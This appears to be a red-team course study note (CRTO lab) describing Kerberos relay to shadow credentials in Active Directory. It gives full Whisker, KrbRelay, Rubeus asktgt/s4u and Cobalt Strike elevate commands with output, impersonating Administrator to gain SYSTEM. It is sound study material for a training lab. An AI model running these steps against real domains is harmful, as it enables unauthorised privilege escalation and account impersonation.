
1) The advantage of using shadow credentials over RBCD is that we don't need to add a fake computer to the domain.  First, verify that the machine your running on has nothing in its `msDS-KeyCredentialLink` attribute.

`beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:wkstn-2$`

2) Run KrbRelay with the `-shadowcred` parameter.

```
beacon> execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred -port 10

[*] Relaying context: dev.cyberbotic.io\WKSTN-2$
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\Windows\system32\rundll32.exe
[*] Register com server
objref:TUVPVw[...snip...]AAAA==:

[*] Forcing SYSTEM authentication
[*] Using CLSID: 90f18417-f0f1-484e-9d3c-59dceee5dbd8

[*] apReq: 608206[...snip...]b23c98
[*] bind: 0
[*] ldap_get_option: LDAP_SASL_BIND_IN_PROGRESS
[*] apRep1: 6f8187[...snip...]f5de0f
[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection
[*] apRep2: 6f5b30[...snip...]7a2322
[*] bind: 0
[*] ldap_get_option: LDAP_SUCCESS
[+] LDAP session established
[*] ldap_modify: LDAP_SUCCESS
```

If you perform these attacks back-to-back and see an error like `(0x800706D3): The authentication service is unknown.` then reboot the machine or wait for the next clock sync.

3)  Like Whisker does, KrbRelay will helpfully provide a full Rubeus command that will request a TGT for WKSTN-2.  However, it will return an RC4 ticket so if you want an AES instead, do:

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-2$ /certificate:MIIJyA[...snip...]QCAgfQ /password:"06ce8e51-a71a-4e0c-b8a3-992851ede95f" /enctype:aes256 /nowrap`

4) The S4U2Self trick can then be used to obtain a HOST service ticket.

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:host/wkstn-2 /user:wkstn-2$ /ticket:doIGkD[...snip...]5pbw== /ptt`

5) Elevate the privilege

`beacon> elevate svc-exe-krb tcp-local`




### ⚠ Opsec




### Properties
---
📆 created   {{19-02-2024}} 15:36
🏷️ tags: #redteam #crto #activedirectory 

---

